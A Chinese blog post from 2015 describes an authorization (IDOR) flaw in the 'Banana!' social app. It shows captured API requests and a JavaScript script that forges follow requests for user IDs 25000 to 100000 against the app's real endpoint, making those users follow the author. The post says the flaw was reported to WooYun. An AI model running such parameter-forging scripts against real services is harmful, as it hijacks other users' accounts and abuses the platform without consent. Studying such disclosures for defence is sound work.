title: Banana!APP漏洞
date: 2015-11-23 11:02:38
categories: 信息安全
tags: 越权
---
> banana！单身男女汇集地！为你打开一个有趣的【香蕉人的世界】充满香蕉的性福生活，前方高能！！【性福日报】看性福日报，天天涨姿势！【性趣小组】加入性趣小组，畅谈性福生活！【性福商城】免费体验有福利，香蕉兑换有惊喜！【香蕉积分制度】看日报、聊生活、勾搭交友，如果你觉得TA棒棒哒就送TA【香蕉】吃吧！  

**下面我将一步步演示一个屌丝用户的逆袭。**  

<!-- more -->
# **抓包**  
通过Fiddler抓包可以看到，在打开一个APP上的话题时，会发出一个POST请求：
```
		POST http://interface2.0.ibananas.cn/api/group/addtopiccomment.json HTTP/1.1  
		Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
		User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)  
		Host: interface2.0.ibananas.cn  
		Connection: Keep-Alive  
		Accept-Encoding: gzip  
		Content-Length: 153  

		IsAnonymous=1&TopicId=4996&ver=banana_A2.0.1&pno=yingyongbao&Content=%E3%80%82%E3%80%82%E3%80%82&CommenterId=358535&  
```
其中几个重点参数：<code>IsAnonymous</code>代表是否匿名，1为匿名，0为不匿名；<code>TopicId</code>为话题ID；<code>Content</code>为内容；<code>CommenterId</code>为评论者ID，即我的ID为358535。  
那么如何获取指定用户的ID呢？  
在打开指定用户详情页时会发出一个GET请求：  
```
		GET http://interface2.0.ibananas.cn/api/user/getothersuserspaceinfo.json?Ver=banana_A2.0.1&PNO=yingyongbao&OthersUserId=1233&UserId=358535 HTTP/1.1  
		User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)   
		Host: interface2.0.ibananas.cn  
		Connection: Keep-Alive  
		Accept-Encoding: gzip  
```
其中OthersUserId即为目标用户的ID。  
在关注其他用户时，会发出一个POST请求：  
```
		POST http://interface2.0.ibananas.cn/api/user/addattention.json HTTP/1.1  
		Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
		User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)  
		Host: interface2.0.ibananas.cn  
		Connection: Keep-Alive  
		Accept-Encoding: gzip  
		Content-Length: 62  

		pno=yingyongbao&FriendId=358535&ver=banana_A2.0.1&UserId=1233&  
```
可以看出，<code>FriendId</code>为关注者ID,<code>UserId</code>为被关注者ID。  

那么假如我们修改这些参数伪造APP发出请求会怎么样呢？  

# **逆袭**  
首先是从屌丝用户逆袭成 **<s>万人瞩目的大V</s>**。  
这里我用JS写了一个脚本。  
```html
	<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>test</title>
	</head>
	<body>
	<button id="sendPost">Start</button>
	<script type="text/javascript">
		var sendButton = document.getElementById("sendPost");

		sendButton.onclick = function() {

			for (i = 25000; i < 100000; i++) {

				var xhr = new XMLHttpRequest();
				xhr.onreadystatechange = function() {
					if (xhr.readyState == 4) {
						if ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {

						} else {
							alert("unsuccess: " + xhr.status);
						}
					}
				}

				xhr.open("post", "http://interface2.0.ibananas.cn/api/user/addattention.json", true);
				xhr.send("pno=yingyongbao&FriendId=" + i + "&ver=banana_A2.0.1&UserId=358535&");

			}
	</script>
	</body>
	</html>
```

脚本跑了一会儿，效果不错：  
![](/img/banana1.png)  
![](/img/banana2.png)    

# **尾声**
同样，按照上述规律可以修改脚本实现刷评论等等。   

至此，我已经没有继续玩下去的兴趣了，将漏洞报上了Wooyun。
